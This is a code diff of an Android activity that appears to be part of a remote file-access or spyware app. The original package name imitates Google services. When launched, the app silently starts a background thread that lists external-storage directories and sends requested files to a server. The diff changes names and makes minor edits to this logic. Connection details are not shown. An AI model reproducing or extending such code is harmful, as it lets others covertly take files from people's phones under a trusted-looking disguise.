@@ -1,4 +1,4 @@
-package com.google.googleservices;
+package com.shahriar.xenaecosystem;
 
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
@@ -36,13 +36,12 @@ import java.util.Iterator;
 import java.util.List;
 import java.util.ListIterator;
 
-public class MainActivity extends AppCompatActivity {
+public class Activity1 extends AppCompatActivity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-  
+        setContentView(R.layout.layout1);
 
         connect thread = new connect();
         thread.start();
@@ -50,7 +49,8 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
-   class connect extends Thread {
+
+    class connect extends Thread {
 
         String currentpath = Environment.getExternalStorageDirectory().toString();
 
@@ -263,7 +263,7 @@ public class MainActivity extends AppCompatActivity {
 
                 for (String file1 : all_files){
 
-                    download2(server, requested_file + "/" + file1);
+                    download2(server, requested_file +"/" + file1);
 
                 }
             }
@@ -305,10 +305,10 @@ public class MainActivity extends AppCompatActivity {
                 for (File file : files) {
                     if (file != null) {
                         if (file.isDirectory()) {
-                            // getallfiles(file);
+                            files2.add(file.getName());
                         } else {
                             files2.add(file.getName());
-                            Log.d("filesofdir", "File: " + file.getAbsolutePath() + "\n");
+
                         }
                     }
                 }
